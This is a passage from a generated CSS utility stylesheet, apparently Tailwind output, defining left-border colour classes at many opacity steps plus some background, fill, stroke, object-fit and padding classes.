.border-l-gray-500\/10 {
  border-left-color: rgb(137 137 138 / 0.1);
}
.border-l-gray-500\/100 {
  border-left-color: rgb(137 137 138 / 1);
}
.border-l-gray-500\/15 {
  border-left-color: rgb(137 137 138 / 0.15);
}
.border-l-gray-500\/20 {
  border-left-color: rgb(137 137 138 / 0.2);
}
.border-l-gray-500\/25 {
  border-left-color: rgb(137 137 138 / 0.25);
}
.border-l-gray-500\/30 {
  border-left-color: rgb(137 137 138 / 0.3);
}
.border-l-gray-500\/35 {
  border-left-color: rgb(137 137 138 / 0.35);
}
.border-l-gray-500\/40 {
  border-left-color: rgb(137 137 138 / 0.4);
}
.border-l-gray-500\/45 {
  border-left-color: rgb(137 137 138 / 0.45);
}
.border-l-gray-500\/5 {
  border-left-color: rgb(137 137 138 / 0.05);
}
.border-l-gray-500\/50 {
  border-left-color: rgb(137 137 138 / 0.5);
}
.border-l-gray-500\/55 {
  border-left-color: rgb(137 137 138 / 0.55);
}
.border-l-gray-500\/60 {
  border-left-color: rgb(137 137 138 / 0.6);
}
.border-l-gray-500\/65 {
  border-left-color: rgb(137 137 138 / 0.65);
}
.border-l-gray-500\/70 {
  border-left-color: rgb(137 137 138 / 0.7);
}
.border-l-gray-500\/75 {
  border-left-color: rgb(137 137 138 / 0.75);
}
.border-l-gray-500\/80 {
  border-left-color: rgb(137 137 138 / 0.8);
}
.border-l-gray-500\/85 {
  border-left-color: rgb(137 137 138 / 0.85);
}
.border-l-gray-500\/90 {
  border-left-color: rgb(137 137 138 / 0.9);
}
.border-l-gray-500\/95 {
  border-left-color: rgb(137 137 138 / 0.95);
}
.border-l-green-100 {
  --tw-border-opacity: 1;
  border-left-color: rgb(158 190 89 / var(--tw-border-opacity));
}
.border-l-green-100\/0 {
  border-left-color: rgb(158 190 89 / 0);
}
.border-l-green-100\/10 {
  border-left-color: rgb(158 190 89 / 0.1);
}
.border-l-green-100\/100 {
  border-left-color: rgb(158 190 89 / 1);
}
.border-l-green-100\/15 {
  border-left-color: rgb(158 190 89 / 0.15);
}
.border-l-green-100\/20 {
  border-left-color: rgb(158 190 89 / 0.2);
}
.border-l-green-100\/25 {
  border-left-color: rgb(158 190 89 / 0.25);
}
.border-l-green-100\/30 {
  border-left-color: rgb(158 190 89 / 0.3);
}
.border-l-green-100\/35 {
  border-left-color: rgb(158 190 89 / 0.35);
}
.border-l-green-100\/40 {
  border-left-color: rgb(158 190 89 / 0.4);
}
.border-l-green-100\/45 {
  border-left-color: rgb(158 190 89 / 0.45);
}
.border-l-green-100\/5 {
  border-left-color: rgb(158 190 89 / 0.05);
}
.border-l-green-100\/50 {
  border-left-color: rgb(158 190 89 / 0.5);
}
.border-l-green-100\/55 {
  border-left-color: rgb(158 190 89 / 0.55);
}
.border-l-green-100\/60 {
  border-left-color: rgb(158 190 89 / 0.6);
}
.border-l-green-100\/65 {
  border-left-color: rgb(158 190 89 / 0.65);
}
.border-l-green-100\/70 {
  border-left-color: rgb(158 190 89 / 0.7);
}
.border-l-green-100\/75 {
  border-left-color: rgb(158 190 89 / 0.75);
}
.border-l-green-100\/80 {
  border-left-color: rgb(158 190 89 / 0.8);
}
.border-l-green-100\/85 {
  border-left-color: rgb(158 190 89 / 0.85);
}
.border-l-green-100\/90 {
  border-left-color: rgb(158 190 89 / 0.9);
}
.border-l-green-100\/95 {
  border-left-color: rgb(158 190 89 / 0.95);
}
.border-l-green-200 {
  --tw-border-opacity: 1;
  border-left-color: rgb(100 120 56 / var(--tw-border-opacity));
}
.border-l-green-200\/0 {
  border-left-color: rgb(100 120 56 / 0);
}
.border-l-green-200\/10 {
  border-left-color: rgb(100 120 56 / 0.1);
}
.border-l-green-200\/100 {
  border-left-color: rgb(100 120 56 / 1);
}
.border-l-green-200\/15 {
  border-left-color: rgb(100 120 56 / 0.15);
}
.border-l-green-200\/20 {
  border-left-color: rgb(100 120 56 / 0.2);
}
.border-l-green-200\/25 {
  border-left-color: rgb(100 120 56 / 0.25);
}
.border-l-green-200\/30 {
  border-left-color: rgb(100 120 56 / 0.3);
}
.border-l-green-200\/35 {
  border-left-color: rgb(100 120 56 / 0.35);
}
.border-l-green-200\/40 {
  border-left-color: rgb(100 120 56 / 0.4);
}
.border-l-green-200\/45 {
  border-left-color: rgb(100 120 56 / 0.45);
}
.border-l-green-200\/5 {
  border-left-color: rgb(100 120 56 / 0.05);
}
.border-l-green-200\/50 {
  border-left-color: rgb(100 120 56 / 0.5);
}
.border-l-green-200\/55 {
  border-left-color: rgb(100 120 56 / 0.55);
}
.border-l-green-200\/60 {
  border-left-color: rgb(100 120 56 / 0.6);
}
.border-l-green-200\/65 {
  border-left-color: rgb(100 120 56 / 0.65);
}
.border-l-green-200\/70 {
  border-left-color: rgb(100 120 56 / 0.7);
}
.border-l-green-200\/75 {
  border-left-color: rgb(100 120 56 / 0.75);
}
.border-l-green-200\/80 {
  border-left-color: rgb(100 120 56 / 0.8);
}
.border-l-green-200\/85 {
  border-left-color: rgb(100 120 56 / 0.85);
}
.border-l-green-200\/90 {
  border-left-color: rgb(100 120 56 / 0.9);
}
.border-l-green-200\/95 {
  border-left-color: rgb(100 120 56 / 0.95);
}
.border-l-green-800 {
  --tw-border-opacity: 1;
  border-left-color: rgb(51 62 27 / var(--tw-border-opacity));
}
.border-l-green-800\/0 {
  border-left-color: rgb(51 62 27 / 0);
}
.border-l-green-800\/10 {
  border-left-color: rgb(51 62 27 / 0.1);
}
.border-l-green-800\/100 {
  border-left-color: rgb(51 62 27 / 1);
}
.border-l-green-800\/15 {
  border-left-color: rgb(51 62 27 / 0.15);
}
.border-l-green-800\/20 {
  border-left-color: rgb(51 62 27 / 0.2);
}
.border-l-green-800\/25 {
  border-left-color: rgb(51 62 27 / 0.25);
}
.border-l-green-800\/30 {
  border-left-color: rgb(51 62 27 / 0.3);
}
.border-l-green-800\/35 {
  border-left-color: rgb(51 62 27 / 0.35);
}
.border-l-green-800\/40 {
  border-left-color: rgb(51 62 27 / 0.4);
}
.border-l-green-800\/45 {
  border-left-color: rgb(51 62 27 / 0.45);
}
.border-l-green-800\/5 {
  border-left-color: rgb(51 62 27 / 0.05);
}
.border-l-green-800\/50 {
  border-left-color: rgb(51 62 27 / 0.5);
}
.border-l-green-800\/55 {
  border-left-color: rgb(51 62 27 / 0.55);
}
.border-l-green-800\/60 {
  border-left-color: rgb(51 62 27 / 0.6);
}
.border-l-green-800\/65 {
  border-left-color: rgb(51 62 27 / 0.65);
}
.border-l-green-800\/70 {
  border-left-color: rgb(51 62 27 / 0.7);
}
.border-l-green-800\/75 {
  border-left-color: rgb(51 62 27 / 0.75);
}
.border-l-green-800\/80 {
  border-left-color: rgb(51 62 27 / 0.8);
}
.border-l-green-800\/85 {
  border-left-color: rgb(51 62 27 / 0.85);
}
.border-l-green-800\/90 {
  border-left-color: rgb(51 62 27 / 0.9);
}
.border-l-green-800\/95 {
  border-left-color: rgb(51 62 27 / 0.95);
}
.border-l-orange {
  --tw-border-opacity: 1;
  border-left-color: rgb(254 137 0 / var(--tw-border-opacity));
}
.border-l-orange\/0 {
  border-left-color: rgb(254 137 0 / 0);
}
.border-l-orange\/10 {
  border-left-color: rgb(254 137 0 / 0.1);
}
.border-l-orange\/100 {
  border-left-color: rgb(254 137 0 / 1);
}
.border-l-orange\/15 {
  border-left-color: rgb(254 137 0 / 0.15);
}
.border-l-orange\/20 {
  border-left-color: rgb(254 137 0 / 0.2);
}
.border-l-orange\/25 {
  border-left-color: rgb(254 137 0 / 0.25);
}
.border-l-orange\/30 {
  border-left-color: rgb(254 137 0 / 0.3);
}
.border-l-orange\/35 {
  border-left-color: rgb(254 137 0 / 0.35);
}
.border-l-orange\/40 {
  border-left-color: rgb(254 137 0 / 0.4);
}
.border-l-orange\/45 {
  border-left-color: rgb(254 137 0 / 0.45);
}
.border-l-orange\/5 {
  border-left-color: rgb(254 137 0 / 0.05);
}
.border-l-orange\/50 {
  border-left-color: rgb(254 137 0 / 0.5);
}
.border-l-orange\/55 {
  border-left-color: rgb(254 137 0 / 0.55);
}
.border-l-orange\/60 {
  border-left-color: rgb(254 137 0 / 0.6);
}
.border-l-orange\/65 {
  border-left-color: rgb(254 137 0 / 0.65);
}
.border-l-orange\/70 {
  border-left-color: rgb(254 137 0 / 0.7);
}
.border-l-orange\/75 {
  border-left-color: rgb(254 137 0 / 0.75);
}
.border-l-orange\/80 {
  border-left-color: rgb(254 137 0 / 0.8);
}
.border-l-orange\/85 {
  border-left-color: rgb(254 137 0 / 0.85);
}
.border-l-orange\/90 {
  border-left-color: rgb(254 137 0 / 0.9);
}
.border-l-orange\/95 {
  border-left-color: rgb(254 137 0 / 0.95);
}
.border-l-pink-100 {
  --tw-border-opacity: 1;
  border-left-color: rgb(225 87 113 / var(--tw-border-opacity));
}
.border-l-pink-100\/0 {
  border-left-color: rgb(225 87 113 / 0);
}
.border-l-pink-100\/10 {
  border-left-color: rgb(225 87 113 / 0.1);
}
.border-l-pink-100\/100 {
  border-left-color: rgb(225 87 113 / 1);
}
.border-l-pink-100\/15 {
  border-left-color: rgb(225 87 113 / 0.15);
}
.border-l-pink-100\/20 {
  border-left-color: rgb(225 87 113 / 0.2);
}
.border-l-pink-100\/25 {
  border-left-color: rgb(225 87 113 / 0.25);
}
.border-l-pink-100\/30 {
  border-left-color: rgb(225 87 113 / 0.3);
}
.border-l-pink-100\/35 {
  border-left-color: rgb(225 87 113 / 0.35);
}
.border-l-pink-100\/40 {
  border-left-color: rgb(225 87 113 / 0.4);
}
.border-l-pink-100\/45 {
  border-left-color: rgb(225 87 113 / 0.45);
}
.border-l-pink-100\/5 {
  border-left-color: rgb(225 87 113 / 0.05);
}
.border-l-pink-100\/50 {
  border-left-color: rgb(225 87 113 / 0.5);
}
.border-l-pink-100\/55 {
  border-left-color: rgb(225 87 113 / 0.55);
}
.border-l-pink-100\/60 {
  border-left-color: rgb(225 87 113 / 0.6);
}
.border-l-pink-100\/65 {
  border-left-color: rgb(225 87 113 / 0.65);
}
.border-l-pink-100\/70 {
  border-left-color: rgb(225 87 113 / 0.7);
}
.border-l-pink-100\/75 {
  border-left-color: rgb(225 87 113 / 0.75);
}
.border-l-pink-100\/80 {
  border-left-color: rgb(225 87 113 / 0.8);
}
.border-l-pink-100\/85 {
  border-left-color: rgb(225 87 113 / 0.85);
}
.border-l-pink-100\/90 {
  border-left-color: rgb(225 87 113 / 0.9);
}
.border-l-pink-100\/95 {
  border-left-color: rgb(225 87 113 / 0.95);
}
.border-l-pink-150 {
  --tw-border-opacity: 1;
  border-left-color: rgb(194 129 149 / var(--tw-border-opacity));
}
.border-l-pink-150\/0 {
  border-left-color: rgb(194 129 149 / 0);
}
.border-l-pink-150\/10 {
  border-left-color: rgb(194 129 149 / 0.1);
}
.border-l-pink-150\/100 {
  border-left-color: rgb(194 129 149 / 1);
}
.border-l-pink-150\/15 {
  border-left-color: rgb(194 129 149 / 0.15);
}
.border-l-pink-150\/20 {
  border-left-color: rgb(194 129 149 / 0.2);
}
.border-l-pink-150\/25 {
  border-left-color: rgb(194 129 149 / 0.25);
}
.border-l-pink-150\/30 {
  border-left-color: rgb(194 129 149 / 0.3);
}
.border-l-pink-150\/35 {
  border-left-color: rgb(194 129 149 / 0.35);
}
.border-l-pink-150\/40 {
  border-left-color: rgb(194 129 149 / 0.4);
}
.border-l-pink-150\/45 {
  border-left-color: rgb(194 129 149 / 0.45);
}
.border-l-pink-150\/5 {
  border-left-color: rgb(194 129 149 / 0.05);
}
.border-l-pink-150\/50 {
  border-left-color: rgb(194 129 149 / 0.5);
}
.border-l-pink-150\/55 {
  border-left-color: rgb(194 129 149 / 0.55);
}
.border-l-pink-150\/60 {
  border-left-color: rgb(194 129 149 / 0.6);
}
.border-l-pink-150\/65 {
  border-left-color: rgb(194 129 149 / 0.65);
}
.border-l-pink-150\/70 {
  border-left-color: rgb(194 129 149 / 0.7);
}
.border-l-pink-150\/75 {
  border-left-color: rgb(194 129 149 / 0.75);
}
.border-l-pink-150\/80 {
  border-left-color: rgb(194 129 149 / 0.8);
}
.border-l-pink-150\/85 {
  border-left-color: rgb(194 129 149 / 0.85);
}
.border-l-pink-150\/90 {
  border-left-color: rgb(194 129 149 / 0.9);
}
.border-l-pink-150\/95 {
  border-left-color: rgb(194 129 149 / 0.95);
}
.border-l-pink-20 {
  --tw-border-opacity: 1;
  border-left-color: rgb(235 224 240 / var(--tw-border-opacity));
}
.border-l-pink-20\/0 {
  border-left-color: rgb(235 224 240 / 0);
}
.border-l-pink-20\/10 {
  border-left-color: rgb(235 224 240 / 0.1);
}
.border-l-pink-20\/100 {
  border-left-color: rgb(235 224 240 / 1);
}
.border-l-pink-20\/15 {
  border-left-color: rgb(235 224 240 / 0.15);
}
.border-l-pink-20\/20 {
  border-left-color: rgb(235 224 240 / 0.2);
}
.border-l-pink-20\/25 {
  border-left-color: rgb(235 224 240 / 0.25);
}
.border-l-pink-20\/30 {
  border-left-color: rgb(235 224 240 / 0.3);
}
.border-l-pink-20\/35 {
  border-left-color: rgb(235 224 240 / 0.35);
}
.border-l-pink-20\/40 {
  border-left-color: rgb(235 224 240 / 0.4);
}
.border-l-pink-20\/45 {
  border-left-color: rgb(235 224 240 / 0.45);
}
.border-l-pink-20\/5 {
  border-left-color: rgb(235 224 240 / 0.05);
}
.border-l-pink-20\/50 {
  border-left-color: rgb(235 224 240 / 0.5);
}
.border-l-pink-20\/55 {
  border-left-color: rgb(235 224 240 / 0.55);
}
.border-l-pink-20\/60 {
  border-left-color: rgb(235 224 240 / 0.6);
}
.border-l-pink-20\/65 {
  border-left-color: rgb(235 224 240 / 0.65);
}
.border-l-pink-20\/70 {
  border-left-color: rgb(235 224 240 / 0.7);
}
.border-l-pink-20\/75 {
  border-left-color: rgb(235 224 240 / 0.75);
}
.border-l-pink-20\/80 {
  border-left-color: rgb(235 224 240 / 0.8);
}
.border-l-pink-20\/85 {
  border-left-color: rgb(235 224 240 / 0.85);
}
.border-l-pink-20\/90 {
  border-left-color: rgb(235 224 240 / 0.9);
}
.border-l-pink-20\/95 {
  border-left-color: rgb(235 224 240 / 0.95);
}
.border-l-pink-200 {
  --tw-border-opacity: 1;
  border-left-color: rgb(188 64 102 / var(--tw-border-opacity));
}
.border-l-pink-200\/0 {
  border-left-color: rgb(188 64 102 / 0);
}
.border-l-pink-200\/10 {
  border-left-color: rgb(188 64 102 / 0.1);
}
.border-l-pink-200\/100 {
  border-left-color: rgb(188 64 102 / 1);
}
.border-l-pink-200\/15 {
  border-left-color: rgb(188 64 102 / 0.15);
}
.border-l-pink-200\/20 {
  border-left-color: rgb(188 64 102 / 0.2);
}
.border-l-pink-200\/25 {
  border-left-color: rgb(188 64 102 / 0.25);
}
.border-l-pink-200\/30 {
  border-left-color: rgb(188 64 102 / 0.3);
}
.border-l-pink-200\/35 {
  border-left-color: rgb(188 64 102 / 0.35);
}
.border-l-pink-200\/40 {
  border-left-color: rgb(188 64 102 / 0.4);
}
.border-l-pink-200\/45 {
  border-left-color: rgb(188 64 102 / 0.45);
}
.border-l-pink-200\/5 {
  border-left-color: rgb(188 64 102 / 0.05);
}
.border-l-pink-200\/50 {
  border-left-color: rgb(188 64 102 / 0.5);
}
.border-l-pink-200\/55 {
  border-left-color: rgb(188 64 102 / 0.55);
}
.border-l-pink-200\/60 {
  border-left-color: rgb(188 64 102 / 0.6);
}
.border-l-pink-200\/65 {
  border-left-color: rgb(188 64 102 / 0.65);
}
.border-l-pink-200\/70 {
  border-left-color: rgb(188 64 102 / 0.7);
}
.border-l-pink-200\/75 {
  border-left-color: rgb(188 64 102 / 0.75);
}
.border-l-pink-200\/80 {
  border-left-color: rgb(188 64 102 / 0.8);
}
.border-l-pink-200\/85 {
  border-left-color: rgb(188 64 102 / 0.85);
}
.border-l-pink-200\/90 {
  border-left-color: rgb(188 64 102 / 0.9);
}
.border-l-pink-200\/95 {
  border-left-color: rgb(188 64 102 / 0.95);
}
.border-l-pink-50 {
  --tw-border-opacity: 1;
  border-left-color: rgb(246 214 221 / var(--tw-border-opacity));
}
.border-l-pink-50\/0 {
  border-left-color: rgb(246 214 221 / 0);
}
.border-l-pink-50\/10 {
  border-left-color: rgb(246 214 221 / 0.1);
}
.border-l-pink-50\/100 {
  border-left-color: rgb(246 214 221 / 1);
}
.border-l-pink-50\/15 {
  border-left-color: rgb(246 214 221 / 0.15);
}
.border-l-pink-50\/20 {
  border-left-color: rgb(246 214 221 / 0.2);
}
.border-l-pink-50\/25 {
  border-left-color: rgb(246 214 221 / 0.25);
}
.border-l-pink-50\/30 {
  border-left-color: rgb(246 214 221 / 0.3);
}
.border-l-pink-50\/35 {
  border-left-color: rgb(246 214 221 / 0.35);
}
.border-l-pink-50\/40 {
  border-left-color: rgb(246 214 221 / 0.4);
}
.border-l-pink-50\/45 {
  border-left-color: rgb(246 214 221 / 0.45);
}
.border-l-pink-50\/5 {
  border-left-color: rgb(246 214 221 / 0.05);
}
.border-l-pink-50\/50 {
  border-left-color: rgb(246 214 221 / 0.5);
}
.border-l-pink-50\/55 {
  border-left-color: rgb(246 214 221 / 0.55);
}
.border-l-pink-50\/60 {
  border-left-color: rgb(246 214 221 / 0.6);
}
.border-l-pink-50\/65 {
  border-left-color: rgb(246 214 221 / 0.65);
}
.border-l-pink-50\/70 {
  border-left-color: rgb(246 214 221 / 0.7);
}
.border-l-pink-50\/75 {
  border-left-color: rgb(246 214 221 / 0.75);
}
.border-l-pink-50\/80 {
  border-left-color: rgb(246 214 221 / 0.8);
}
.border-l-pink-50\/85 {
  border-left-color: rgb(246 214 221 / 0.85);
}
.border-l-pink-50\/90 {
  border-left-color: rgb(246 214 221 / 0.9);
}
.border-l-pink-50\/95 {
  border-left-color: rgb(246 214 221 / 0.95);
}
.border-l-pink-800 {
  --tw-border-opacity: 1;
  border-left-color: rgb(87 22 42 / var(--tw-border-opacity));
}
.border-l-pink-800\/0 {
  border-left-color: rgb(87 22 42 / 0);
}
.border-l-pink-800\/10 {
  border-left-color: rgb(87 22 42 / 0.1);
}
.border-l-pink-800\/100 {
  border-left-color: rgb(87 22 42 / 1);
}
.border-l-pink-800\/15 {
  border-left-color: rgb(87 22 42 / 0.15);
}
.border-l-pink-800\/20 {
  border-left-color: rgb(87 22 42 / 0.2);
}
.border-l-pink-800\/25 {
  border-left-color: rgb(87 22 42 / 0.25);
}
.border-l-pink-800\/30 {
  border-left-color: rgb(87 22 42 / 0.3);
}
.border-l-pink-800\/35 {
  border-left-color: rgb(87 22 42 / 0.35);
}
.border-l-pink-800\/40 {
  border-left-color: rgb(87 22 42 / 0.4);
}
.border-l-pink-800\/45 {
  border-left-color: rgb(87 22 42 / 0.45);
}
.border-l-pink-800\/5 {
  border-left-color: rgb(87 22 42 / 0.05);
}
.border-l-pink-800\/50 {
  border-left-color: rgb(87 22 42 / 0.5);
}
.border-l-pink-800\/55 {
  border-left-color: rgb(87 22 42 / 0.55);
}
.border-l-pink-800\/60 {
  border-left-color: rgb(87 22 42 / 0.6);
}
.border-l-pink-800\/65 {
  border-left-color: rgb(87 22 42 / 0.65);
}
.border-l-pink-800\/70 {
  border-left-color: rgb(87 22 42 / 0.7);
}
.border-l-pink-800\/75 {
  border-left-color: rgb(87 22 42 / 0.75);
}
.border-l-pink-800\/80 {
  border-left-color: rgb(87 22 42 / 0.8);
}
.border-l-pink-800\/85 {
  border-left-color: rgb(87 22 42 / 0.85);
}
.border-l-pink-800\/90 {
  border-left-color: rgb(87 22 42 / 0.9);
}
.border-l-pink-800\/95 {
  border-left-color: rgb(87 22 42 / 0.95);
}
.border-l-purple {
  --tw-border-opacity: 1;
  border-left-color: rgb(158 89 190 / var(--tw-border-opacity));
}
.border-l-purple\/0 {
  border-left-color: rgb(158 89 190 / 0);
}
.border-l-purple\/10 {
  border-left-color: rgb(158 89 190 / 0.1);
}
.border-l-purple\/100 {
  border-left-color: rgb(158 89 190 / 1);
}
.border-l-purple\/15 {
  border-left-color: rgb(158 89 190 / 0.15);
}
.border-l-purple\/20 {
  border-left-color: rgb(158 89 190 / 0.2);
}
.border-l-purple\/25 {
  border-left-color: rgb(158 89 190 / 0.25);
}
.border-l-purple\/30 {
  border-left-color: rgb(158 89 190 / 0.3);
}
.border-l-purple\/35 {
  border-left-color: rgb(158 89 190 / 0.35);
}
.border-l-purple\/40 {
  border-left-color: rgb(158 89 190 / 0.4);
}
.border-l-purple\/45 {
  border-left-color: rgb(158 89 190 / 0.45);
}
.border-l-purple\/5 {
  border-left-color: rgb(158 89 190 / 0.05);
}
.border-l-purple\/50 {
  border-left-color: rgb(158 89 190 / 0.5);
}
.border-l-purple\/55 {
  border-left-color: rgb(158 89 190 / 0.55);
}
.border-l-purple\/60 {
  border-left-color: rgb(158 89 190 / 0.6);
}
.border-l-purple\/65 {
  border-left-color: rgb(158 89 190 / 0.65);
}
.border-l-purple\/70 {
  border-left-color: rgb(158 89 190 / 0.7);
}
.border-l-purple\/75 {
  border-left-color: rgb(158 89 190 / 0.75);
}
.border-l-purple\/80 {
  border-left-color: rgb(158 89 190 / 0.8);
}
.border-l-purple\/85 {
  border-left-color: rgb(158 89 190 / 0.85);
}
.border-l-purple\/90 {
  border-left-color: rgb(158 89 190 / 0.9);
}
.border-l-purple\/95 {
  border-left-color: rgb(158 89 190 / 0.95);
}
.border-l-red {
  --tw-border-opacity: 1;
  border-left-color: rgb(249 65 68 / var(--tw-border-opacity));
}
.border-l-red\/0 {
  border-left-color: rgb(249 65 68 / 0);
}
.border-l-red\/10 {
  border-left-color: rgb(249 65 68 / 0.1);
}
.border-l-red\/100 {
  border-left-color: rgb(249 65 68 / 1);
}
.border-l-red\/15 {
  border-left-color: rgb(249 65 68 / 0.15);
}
.border-l-red\/20 {
  border-left-color: rgb(249 65 68 / 0.2);
}
.border-l-red\/25 {
  border-left-color: rgb(249 65 68 / 0.25);
}
.border-l-red\/30 {
  border-left-color: rgb(249 65 68 / 0.3);
}
.border-l-red\/35 {
  border-left-color: rgb(249 65 68 / 0.35);
}
.border-l-red\/40 {
  border-left-color: rgb(249 65 68 / 0.4);
}
.border-l-red\/45 {
  border-left-color: rgb(249 65 68 / 0.45);
}
.border-l-red\/5 {
  border-left-color: rgb(249 65 68 / 0.05);
}
.border-l-red\/50 {
  border-left-color: rgb(249 65 68 / 0.5);
}
.border-l-red\/55 {
  border-left-color: rgb(249 65 68 / 0.55);
}
.border-l-red\/60 {
  border-left-color: rgb(249 65 68 / 0.6);
}
.border-l-red\/65 {
  border-left-color: rgb(249 65 68 / 0.65);
}
.border-l-red\/70 {
  border-left-color: rgb(249 65 68 / 0.7);
}
.border-l-red\/75 {
  border-left-color: rgb(249 65 68 / 0.75);
}
.border-l-red\/80 {
  border-left-color: rgb(249 65 68 / 0.8);
}
.border-l-red\/85 {
  border-left-color: rgb(249 65 68 / 0.85);
}
.border-l-red\/90 {
  border-left-color: rgb(249 65 68 / 0.9);
}
.border-l-red\/95 {
  border-left-color: rgb(249 65 68 / 0.95);
}
.border-l-white {
  --tw-border-opacity: 1;
  border-left-color: rgb(255 255 255 / var(--tw-border-opacity));
}
.border-l-white\/0 {
  border-left-color: rgb(255 255 255 / 0);
}
.border-l-white\/10 {
  border-left-color: rgb(255 255 255 / 0.1);
}
.border-l-white\/100 {
  border-left-color: rgb(255 255 255 / 1);
}
.border-l-white\/15 {
  border-left-color: rgb(255 255 255 / 0.15);
}
.border-l-white\/20 {
  border-left-color: rgb(255 255 255 / 0.2);
}
.border-l-white\/25 {
  border-left-color: rgb(255 255 255 / 0.25);
}
.border-l-white\/30 {
  border-left-color: rgb(255 255 255 / 0.3);
}
.border-l-white\/35 {
  border-left-color: rgb(255 255 255 / 0.35);
}
.border-l-white\/40 {
  border-left-color: rgb(255 255 255 / 0.4);
}
.border-l-white\/45 {
  border-left-color: rgb(255 255 255 / 0.45);
}
.border-l-white\/5 {
  border-left-color: rgb(255 255 255 / 0.05);
}
.border-l-white\/50 {
  border-left-color: rgb(255 255 255 / 0.5);
}
.border-l-white\/55 {
  border-left-color: rgb(255 255 255 / 0.55);
}
.border-l-white\/60 {
  border-left-color: rgb(255 255 255 / 0.6);
}
.border-l-white\/65 {
  border-left-color: rgb(255 255 255 / 0.65);
}
.border-l-white\/70 {
  border-left-color: rgb(255 255 255 / 0.7);
}
.border-l-white\/75 {
  border-left-color: rgb(255 255 255 / 0.75);
}
.border-l-white\/80 {
  border-left-color: rgb(255 255 255 / 0.8);
}
.border-l-white\/85 {
  border-left-color: rgb(255 255 255 / 0.85);
}
.border-l-white\/90 {
  border-left-color: rgb(255 255 255 / 0.9);
}
.border-l-white\/95 {
  border-left-color: rgb(255 255 255 / 0.95);
}
.border-l-yellow {
  --tw-border-opacity: 1;
  border-left-color: rgb(255 214 102 / var(--tw-border-opacity));
}
.border-l-yellow\/0 {
  border-left-color: rgb(255 214 102 / 0);
}
.border-l-yellow\/10 {
  border-left-color: rgb(255 214 102 / 0.1);
}
.border-l-yellow\/100 {
  border-left-color: rgb(255 214 102 / 1);
}
.border-l-yellow\/15 {
  border-left-color: rgb(255 214 102 / 0.15);
}
.border-l-yellow\/20 {
  border-left-color: rgb(255 214 102 / 0.2);
}
.border-l-yellow\/25 {
  border-left-color: rgb(255 214 102 / 0.25);
}
.border-l-yellow\/30 {
  border-left-color: rgb(255 214 102 / 0.3);
}
.border-l-yellow\/35 {
  border-left-color: rgb(255 214 102 / 0.35);
}
.border-l-yellow\/40 {
  border-left-color: rgb(255 214 102 / 0.4);
}
.border-l-yellow\/45 {
  border-left-color: rgb(255 214 102 / 0.45);
}
.border-l-yellow\/5 {
  border-left-color: rgb(255 214 102 / 0.05);
}
.border-l-yellow\/50 {
  border-left-color: rgb(255 214 102 / 0.5);
}
.border-l-yellow\/55 {
  border-left-color: rgb(255 214 102 / 0.55);
}
.border-l-yellow\/60 {
  border-left-color: rgb(255 214 102 / 0.6);
}
.border-l-yellow\/65 {
  border-left-color: rgb(255 214 102 / 0.65);
}
.border-l-yellow\/70 {
  border-left-color: rgb(255 214 102 / 0.7);
}
.border-l-yellow\/75 {
  border-left-color: rgb(255 214 102 / 0.75);
}
.border-l-yellow\/80 {
  border-left-color: rgb(255 214 102 / 0.8);
}
.border-l-yellow\/85 {
  border-left-color: rgb(255 214 102 / 0.85);
}
.border-l-yellow\/90 {
  border-left-color: rgb(255 214 102 / 0.9);
}
.border-l-yellow\/95 {
  border-left-color: rgb(255 214 102 / 0.95);
}
.bg-\[\#515E36\] {
  --tw-bg-opacity: 1;
  background-color: rgb(81 94 54 / var(--tw-bg-opacity));
}
.bg-\[\#F0F2EF\] {
  --tw-bg-opacity: 1;
  background-color: rgb(240 242 239 / var(--tw-bg-opacity));
}
.bg-\[\#F30000\] {
  --tw-bg-opacity: 1;
  background-color: rgb(243 0 0 / var(--tw-bg-opacity));
}
.bg-\[\#FFD4D4\] {
  --tw-bg-opacity: 1;
  background-color: rgb(255 212 212 / var(--tw-bg-opacity));
}
.bg-black {
  --tw-bg-opacity: 1;
  background-color: rgb(29 32 34 / var(--tw-bg-opacity));
}
.bg-blue {
  --tw-bg-opacity: 1;
  background-color: rgb(55 135 255 / var(--tw-bg-opacity));
}
.bg-gray-100 {
  --tw-bg-opacity: 1;
  background-color: rgb(175 175 177 / var(--tw-bg-opacity));
}
.bg-gray-200 {
  --tw-bg-opacity: 1;
  background-color: rgb(206 214 222 / var(--tw-bg-opacity));
}
.bg-gray-300 {
  --tw-bg-opacity: 1;
  background-color: rgb(226 232 236 / var(--tw-bg-opacity));
}
.bg-gray-400 {
  --tw-bg-opacity: 1;
  background-color: rgb(195 198 203 / var(--tw-bg-opacity));
}
.bg-gray-50 {
  --tw-bg-opacity: 1;
  background-color: rgb(245 245 245 / var(--tw-bg-opacity));
}
.bg-green-100 {
  --tw-bg-opacity: 1;
  background-color: rgb(158 190 89 / var(--tw-bg-opacity));
}
.bg-pink-100 {
  --tw-bg-opacity: 1;
  background-color: rgb(225 87 113 / var(--tw-bg-opacity));
}
.bg-pink-200 {
  --tw-bg-opacity: 1;
  background-color: rgb(188 64 102 / var(--tw-bg-opacity));
}
.bg-pink-50 {
  --tw-bg-opacity: 1;
  background-color: rgb(246 214 221 / var(--tw-bg-opacity));
}
.bg-red {
  --tw-bg-opacity: 1;
  background-color: rgb(249 65 68 / var(--tw-bg-opacity));
}
.bg-white {
  --tw-bg-opacity: 1;
  background-color: rgb(255 255 255 / var(--tw-bg-opacity));
}
.bg-yellow {
  --tw-bg-opacity: 1;
  background-color: rgb(255 214 102 / var(--tw-bg-opacity));
}
.fill-\[\#F6D6DD\] {
  fill: #F6D6DD;
}
.fill-\[inherit\] {
  fill: inherit;
}
.fill-gray-100 {
  fill: #AFAFB1;
}
.fill-green-100 {
  fill: #9EBE59;
}
.fill-none {
  fill: none;
}
.fill-pink-100 {
  fill: #E15771;
}
.fill-pink-150 {
  fill: #C28195;
}
.fill-pink-800 {
  fill: #57162A;
}
.fill-white {
  fill: #FFFFFF;
}
.fill-yellow {
  fill: #FFD666;
}
.stroke-gray-500 {
  stroke: #89898A;
}
.stroke-none {
  stroke: none;
}
.stroke-pink-100 {
  stroke: #E15771;
}
.object-contain {
  -o-object-fit: contain;
     object-fit: contain;
}
.object-cover {
  -o-object-fit: cover;
     object-fit: cover;
}
.object-left-top {
  -o-object-position: left top;
     object-position: left top;
}
.object-top {
  -o-object-position: top;
     object-position: top;
}
.p-0 {
  padding: 0px;
}
.p-1 {
  padding: 1px;
}
.p-\[2px\] {
  padding: 2px;
}
.p-\[3px\] {
  padding: 3px;
}
.p-md {
  padding: 24px;
}
.p-sm {
  padding: 12px;
}
.p-xs {
  padding: 6px;
}
.px-0 {
  padding-left: 0px;
  padding-right: 0px;
}
